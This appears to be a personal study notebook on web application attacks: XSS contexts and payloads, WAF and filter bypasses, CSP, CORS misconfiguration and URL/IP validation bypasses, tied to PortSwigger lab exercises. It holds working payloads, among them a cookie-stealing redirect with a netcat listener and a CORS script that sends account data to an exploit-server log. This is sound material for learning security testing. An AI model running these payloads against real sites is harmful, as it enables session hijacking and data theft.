### XSS types

XSS types
- Types of XSS: search, form, and parameter
    1. Reflected : 
    2. Stored 
    3. DOM: search for eval
    4. Blind : XSS hunter express


When you are seaching somewhere and if its burp then the search text added in dom by js, will not be shown


### Reflected or Stored XSS 
- First do the spider or  katana to do  crawling
- XSS on Wordpress
- Check this everywhere in every input or anything having params or link tag: `<img src=0 onerror='alert(1)'>`
- encode URL encode/base64 once or twice for the payload upto 5 times
- payload file use fuzzing to find xss
- check CSP if it allows it
- Install dom invader in burp
- We don't have to close the tag properly, html will still parse it.
- `<script>` are prioritised to break out of string under js context
- If space is blocked in js then we can use `/**/` which is basically comment
- Check for what are all things that are escaped and what are not excaped
  - `'"</\->` or `/["'\\`]/g, '\\$&()=<>`
- HTML entity Decode and encode
- Advance concept:
  - `throw onerror=alert,123` : `throw` only returns the last argument and onerror is the handler assigned with alert, and also throw itself triggers onerror function which in turns execute alert(123)
  - `x=x=>{}` is a function with one argument
  - `toString` is inbuild function call when any string conversion is required e.g. `window+''` will trigger `toString` on `window`
  -     ```
        function f(a,b){
            return a+b;
        }
        console.log(f(2,4,x=5));
        ```
        You can see that extra argument(any number of arguments) are ignored and can be given expression which is evaluated.
  - Ref: https://portswigger.net/research/xss-without-parentheses-and-semi-colons
  - in `href`, anything after `javascript` is js code
  - Browser parses  HTML tags and attributes within a response, then it perform HTML-decoding of tag attribute values before they are processed any further.So if thes tag attribute contains js code, it is then decoded and the further processing is done. If the server side blocks or sanitises certain characters, then it can be bypassed using html encoding of those characters.
    - `<a href="#" onclick="... var input='<payload>'; ...">`
    - `&apos;-alert(document.domain)-&apos;` as `'` is encoded as `&apos;`
  - Template literals ==  <backquote> : are encapsulated in backticks  instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax. 
    -   ```
        document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
        ```
    - Backticks need not to be escaped but `$(expr)` should be used for xss
    - single quote or double code needs not be escaped
  
- ployglots:  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e     also search for more

- Use Iframe to trigger event that requires manual change of environment of browser like window resize and then use js to do the resize
`<iframe scr="xss-payload" onload=this.style.width='100px'>`

Reflected cross site attack:
- Check for input box, params which gets reflected in page and `<link>` in head
    * `<script>alert(1)</script>`
    * `<script>window.location='http://localhost:8080?cookie=' + document.cookie</script>` and run `nc -vv -l -p 8080` to listen
    * If input renders inside the tag then don't use script 
    `</select><img src=0 onerror='alert(1)'>` to breakout
    * `<img src=0 onerror="alert(1)">`
    * `Window.location` is vulnerable because anything after # is not send in the URL to server but stays on the client/browser side
    `URL#default=<script>alert(document.cookie)</script>` 


    * check if eval is used  in the js and this is always vulnerable. 
    * JSON and Js response are not same 
        `abcd\"-alert(1)}//` for getting response like {"results":[],"searchTerm":"abcd\\"-alert(1)}//"}
    * also check if escape is there for few characters like /, ", ' 
    * use - instead of + because + is always URL encoded
 
    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
    * `<a href="javascript:alert(document.domain)">`

- Reflected xss but protected by web application firewall (WAF) to protect against common XSS vectors.

	`<xss autofocus tabindex=1 onfocus=alert(document.cookie) ></xss>`
	Embeded inside `<script> location=’URL’</script>`
 
- How to focus any element?
  - By default only form element are focussable, but usage of `tabindex` makes non-form element focussable
  - adding `id` to element and the in URL put `#id` make it focussable
  
  `<custom-tag onfocus="alert(document.cookie)" id="x" tabindex=0 >`
- payloads for reflected content inside js:
  `'-alert(document.domain)-'`
  `';alert(document.domain)//`
	But sometimes backslash is used to prevent breakout so attacker use extra backslash to nullify the introduced  backslash eg. \';alert(document.domain)// => \\';alert(document.domain)// which is being nullified
- 	Update the tag list with svg variants
	`<svg><animatetransform onbegin=alert(1) attributeName=transform>` XSS in HTML tag attributes
    `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=5 y=20>click`
    * `text` tag inside svg should have x and y for it to render
    * `animate` inside `svg` changes the attribute value of parent
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
`"><script>alert(document.domain)</script>`
More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
`" autofocus onfocus=alert(document.domain) x="`
- `accesskey` attribute of hidden: You might encounter websites that encode angle brackets but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The accesskey attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. In the next lab you can experiment with access keys and exploit a canonical tag. You can exploit XSS in hidden input fields using a technique invented by PortSwigger Research.
`<input type="hidden" accesskey="X" onclick="alert(1)">`
`<link rel="canonical" accesskey="X" onclick="alert(1)" />`
 Note: if your reflection is repeated then the key combination will fail. A workaround is to then inject another attribute that breaks the second reflection. e.g. `" accesskey="x" onclick="alert(1)" x='`
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag 


## Stored cross site attack
    <script>alert(1)</script>

Dom-based XSS
    DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.
    e.g. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
    sources: All these are the sources of getting data which is attacker-controlled.
        This can be done by doing serach in the url an check if something is coming or not. But this is not available with DOM because js manipulate here is not shown on inspect source
        location.search
        location.hash
        document.referrer
        document.cookie
        document.write()
        document.writeln()
        document.domain
        element.innerHTML
        element.outerHTML
        element.insertAdjacentHTML
        element.onevent
        
    sinks: This evaluates attacker script if the attacker data is passed
        This is tricky because the dom might not contain it as it happens with contains tag
        document.body.innerHTML
        document.write
        $('')
        or any eval function


        Taint-flow vulnerabilities
            document.URL
            document.documentURI
            document.URLUnencoded
            document.baseURI
            location
            document.cookie
            document.referrer
            window.name
            history.pushState
            history.replaceState
            localStorage
            sessionStorage
            IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
            Database

        js sinks 
            add()
            after()
            append()
            animate()
            insertAfter()
            insertBefore()
            before()
            html()
            prepend()
            replaceAll()
            replaceWith()
            wrap()
            wrapInner()
            wrapAll()
            has()
            constructor()
            init()
            index()
            jQuery.parseHTML()
            $.parseHTML()

    attacking through img tag error
        im = document.createElement("img")
        im.src =0 #It sends the request looking for image instantenously and gets error
        $('section .blog-list h2:contains(<img src="o" onerror="alert(0)">') # because contains creates a detached element if tags are passed


    attack warning 
        The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire so use `<img src` onerror or onload tags>


    DOM XSS in AngularJS
        https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
            AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes
            ng-app attribute

            {{$on.constructor('alert(1)')()}}

    <script>document.write(alert(1))</script>


 
## questions

Ex:6


 
Ex:7: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded 
	"onmouseover="alert(1) inside <h1>0 search results for '"onmouseover="alert(1)'</h1>
Warning : how is this working?
	Create an  html element and check if the above can be recreated


https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
	http://foo?&apos;-alert(1)-&apos;
	=     http://foo?’-alert(1)-’

Expert level problem:
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked 
WAF stands for Web Application Firewall
Extra materials to read: https://portswigger.net/research/xss-without-parentheses-and-semi-colons 

Nice blog: https://portswigger.net/research/xss-without-parentheses-and-semi-colons 
	<script>throw onerror=alert,'some string',123,'haha'</script>
Cheatsheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

Cheatsheet2: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html


TO read:
	https://portswigger.net/web-security/dom-based
  




#### CSP
CSP for directive with random hash that tells to execute only if the script contains that nonce.
Also it refers to the source where js can be executed like `self`

- CSP does not completly prevent XSS
- `unsafe inline` in CSP is vulnerable
- CSP bypass for XSS. 
- any `unsafe` is actually unsafe

https://www.cobalt.io/blog/csp-and-bypasses

#### CORS:

Cross origin resource: It tells what resource to access depending upon the header and origin provided. 
- Shodan can be used to check ACAO or other very easily. Query : `"Access-Control-Allow-Origin: null"`
- URL 'Origin: http://example.com`.hackxor.net/'(safari) is parses as Origin: http://example.com or 'Origin: http://example.com_hackxor.net/' (firefox or chrome)
- Do add `Origin` in header
- Do subdomain check and domain suffix check
- Do protocol check
- Do check if Vary is added in response header as most of the time dynamic ACAO header is used
- Do `origin: null` check
- Most of the time intranet have ACAO set to `*`, ref: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties 
- Checking if all subdomain are whitelisted `Access-Control-Allow-Origin: *.example.com`
- checking the protocol restriction: 
If a website is accessed over HTTPS but will happily accept CORS interactions from http://wherever, someone performing an active man-in-the-middle (MITM) attack can pretty much bypass its use of HTTPS entirely. ![CORS Protocol Relaxation Vulnerability](images/cors-protocol.png)


`
Access-Control-Allow-Origin: https://foo.example # what resource are allowed
Access-Control-Allow-Methods: POST, GET, OPTIONS # What methods are allowed
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type # 
Access-Control-Allow-credentials: true # allow cookies
`
- Access-Control-Allow-Origin: Specifies which origins are allowed to access the resource. For example, https://foo.example allows requests only from that domain, preventing access from unauthorized origins.

- Access-Control-Allow-Methods: Defines the HTTP methods (e.g., POST, GET, OPTIONS) permitted in cross-origin requests. This ensures that only approved methods can be used when interacting with the resource.

- Access-Control-Allow-Headers: Lists the custom headers (e.g., X-PINGOTHER, Content-Type) that the client is allowed to send in cross-origin requests. This ensures compatibility with server expectations.

- Access-Control-Allow-credentials: Indicates whether the resource allows sending credentials (e.g., cookies) in cross-origin requests. This is often used for authentication purposes. When set to false, cookie or csrf token cannot be stolen

- Does not work in firefox but works at chrome
- SOP (Same Origin Policy): has 3 parts: protocol + domain + port.
- Check using different value of `origin` and different protocol like `http(s)` in request header to see if we get ACAO
    Intercept all traffic and exploit via man in the middle: https://portswigger.net/web-security/cors , section: Breaking TLS with poorly configured CORS
- dynamic gereration of ACAO using wildcard
  * Add `Origin` to see if ACAO is coming in response
  * Some origin starts with is vulnerable https://btc.net.evil.net
  * some origin ends with is also vulnerable 
    * https://*zomato.com is vulnerable as https://notzomto.com can be used
  * Null origin is also vulnerable
    * `ACAO: null`, `ACAC: true` is very dangerous
    * iframe has sandbox when used gives origin null which has ACAO set to null
    *  Cross-origin redirects.
    *  Requests from serialized data.
    *  Request using the file: protocol. 
    * null origin is same as `*` and more dangerous as `*`
      * `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> cors request here</script>"></iframe>`
  
  * with origin as `*` or `null`, ACAC is not applicable hence set to false automatically, also the website has to do setup of ACAO with wildcard or something and that is the reason that it is dynamically generated
  * `*.mysite.com` (all subdomain) in ACAO is also vulnerable if any of your subdomain is vulnerable
    ```
      https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
    ```
    solve this once again: https://portswigger.net/web-security/cors/lab-breaking-https-attack
  * Indication where dynamic header is used, is to check if the origin is not given in request but AC headers are there in response and
  * ACAO is not sent in response by most of server when origin is not given in request so check with origin request header to get if CORS header are there in response
  * `ACAC` is false by default
- Developer gold
  - Specifiying this static header call `Vary:Origin` if dynamic header are used as if not given then
  - Even w3 sites do not have this header. haha
  - cache poisioning: client side
- `HttpOnly` flag is responisble for sharing cookies across all subdomain of a domain. if set: cannot read document.cookie
- Payload for victim
  ```
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://0a36001603054e9880ee94d90099005b.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      <!-- req.setRequestHeader('Origin', 'null'); -->
  
      req.send();
  
      function reqListener() {
        console.log(window.location)
          window.location='https://exploit-0a7b00a703db4e8f808793a201010000.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
      };
  ```
  resolve this lab: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack 
- Ref: https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

- URL validation bypass cheatsheet: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

### IP ADDRESS BYPASS
- Applications decode URLs incorrectly or don't normalize input before validation.
%68%74%74%70%73://example.com	Encoded https://example.com.
https://evil.com%00.example.com	Null byte terminates validation checks.
https://%65%78%61%6D%70%6C%65.com	Encoded domain (e.g., example.com).
http://127.0.0.1%09.evil.com	Tab-separated subdomain.


- Applications whitelist specific IPs or validate hostnames but fail to account for all IP formats.
http://2130706433	Decimal form of 127.0.0.1.
'http://0x7f000001'	Hexadecimal form of 127.0.0.1. 
http://017700000001	Octal form of 127.0.0.1.
http://127.0.1	    Shortened version of 127.0.0.1.
    Applications redirect users based on unvalidated URLs, leading to open redirects.

- Bypass Techniques:Applications redirect users based on unvalidated URLs, leading to open redirects.

https://example.com/?url=http://evil.com	Unvalidated URL in parameters.
https://evil.com/redirect?to=https://example.com	Redirection chain abuse.
https://example.com/%2f%2fevil.com	Encoded //evil.com bypasses.

- Fragment identifiers (#) are ignored by servers but used by browsers.
		